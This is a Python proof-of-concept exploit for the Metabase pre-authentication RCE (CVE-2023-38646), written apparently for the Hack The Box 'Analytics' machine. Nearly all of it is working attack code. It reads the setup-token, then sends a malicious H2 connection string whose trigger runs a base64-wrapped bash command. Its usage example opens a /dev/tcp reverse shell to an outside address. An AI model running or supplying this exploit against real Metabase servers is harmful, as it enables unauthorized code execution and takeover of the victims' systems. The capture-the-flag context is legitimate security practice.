#!/usr/bin/env python3

'''
HTB Analytics
-------------
Description: Metabase Pre-auth RCE PoC (CVE-2023-38646)
Author: Marss
Repository: https://github.com/E1P0TR0
Date: 19 Oct, 2023
'''

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from base64 import b64encode
from json import loads
from requests import get, post
from requests.exceptions import ConnectionError, ConnectTimeout
from signal import signal, SIGINT
from sys import argv

import pdb

# Ctrl + c
signal(SIGINT, lambda signum, frame: exit('\n[!] User aborted.'))

# Main class
class Exploit:

    def __init__(self, args):
        
        self.command = args.command
        self.target = {'base_url':'http://data.analytical.htb'}

    def run(self):

        if self.target_response():
            
            self.save_setup_token()
            self.send_db_validation()

    def target_response(self) -> bool:

        try:
            response = get(self.target['base_url'], timeout=5)

            if response.ok:
                print('\n[+] Target up.')

            return response.ok
            
        except ConnectTimeout:
            exit('\n[!] Verify VPN connection.')
        except ConnectionError:
            exit(f'\n[x] Can\'t resolve {self.target["base_url"]}')

    def save_setup_token(self):

        try:
            response = get(self.target['base_url'] + '/api/session/properties')

            if response.status_code != 200:
                exit('\n[x] Something went wrong.')

            self.target['token'] = loads(response.text)['setup-token']
            print('[*] Setup-token: ' + self.target['token'])
        
        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def send_db_validation(self):

        try:
            b64_command = b64encode(self.command.encode()).decode()
            payload = "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo," + b64_command + "}|{base64,-d}|{bash,-i}')\n$$--=x"

            post_data = {
                'token': self.target['token'],
                'details':{
                    'details':{
                        'db':payload,
                        'advanced_options':False,
                        'ssl':True
                    },
                    'name':'x',
                    'engine':'h2'
                }
            }
            response = post(self.target['base_url'] + '/api/setup/validate',
                json=post_data,
                timeout=5)
            
            if 'Vector arg to map conj must be a pair' in response.text:
                exit('\n[x] Something went wrong.')

            print('[+] Command executed.')

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

# Main flow
if __name__ == '__main__':

    title = '\n| Metabase PoC RCE |'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''Example:
        python3 {argv[0]} -c 'sh -i >& /dev/tcp/10.10.10.10/1111 0>&1'
        ''')
    
    parser.add_argument('-c', 
        '--cmd',
        dest='command',
        type=str,
        required=True,
        help='Command to execute')

    args = parser.parse_args()

    print(title)

    exploit = Exploit(args)
    exploit.run()